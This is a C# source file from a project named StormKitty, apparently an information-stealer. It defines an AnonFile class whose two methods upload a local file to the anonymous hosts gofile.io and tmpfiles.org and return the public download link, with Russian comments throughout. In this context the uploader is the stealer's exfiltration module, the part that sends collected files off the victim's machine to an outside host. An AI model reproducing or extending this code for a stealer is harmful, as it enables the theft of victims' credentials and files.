using System;
using System.Net;
using System.Text;
using System.Collections.Specialized;

namespace StormKitty
{
    internal sealed class AnonFile
    {
        public static string Upload(string filePath, bool api = false)
        {
            try
            {
                using (WebClient client = new WebClient())
                {
                    // Загружаем файл на глобальный эндпоинт GoFile
                    byte[] responseBytes = client.UploadFile("https://upload.gofile.io/uploadfile", filePath);
                    string responseBody = Encoding.UTF8.GetString(responseBytes);

                    // Парсим JSON-ответ
                    if (responseBody.Contains("\"status\":\"ok\""))
                    {
                        // Извлекаем downloadPage из data
                        int dataIndex = responseBody.IndexOf("\"data\":") + 7;
                        int dataEndIndex = responseBody.IndexOf("}", dataIndex) + 1;
                        string dataJson = responseBody.Substring(dataIndex, dataEndIndex - dataIndex);

                        // Ищем downloadPage в data
                        if (dataJson.Contains("\"downloadPage\""))
                        {
                            int pageIndex = dataJson.IndexOf("\"downloadPage\":\"") + 16;
                            int pageEndIndex = dataJson.IndexOf("\"", pageIndex);
                            string downloadPage = dataJson.Substring(pageIndex, pageEndIndex - pageIndex);
                            return downloadPage;
                        }
                    }
                    else
                    {
                        Console.WriteLine("Ошибка загрузки: " + responseBody);
                    }
                }
            }
            catch (Exception error)
            {
                Console.WriteLine("Ошибка Upload: " + error.Message);
            }
            return null;
        }

        public static string Upload2(string file, bool api = false)
        {
            try
            {
                using (WebClient Client = new WebClient())
                {
                    // Загружаем файл на tmpfiles.org
                    byte[] Response = Client.UploadFile("https://tmpfiles.org/api/v1/upload", file);
                    string ResponseBody = Encoding.UTF8.GetString(Response);

                    // Парсим JSON-ответ
                    if (ResponseBody.Contains("\"status\":\"success\""))
                    {
                        // Извлекаем ссылку на файл
                        int linkIndex = ResponseBody.IndexOf("\"url\":\"") + 7;
                        int linkEndIndex = ResponseBody.IndexOf("\"", linkIndex);
                        string fileUrl = ResponseBody.Substring(linkIndex, linkEndIndex - linkIndex);
                        return fileUrl;
                    }
                    else
                    {
                        Console.WriteLine("Ошибка при загрузке файла: " + ResponseBody);
                    }
                }
            }
            catch (Exception error)
            {
                Console.WriteLine(error);
            }
            return null;
        }
    }
}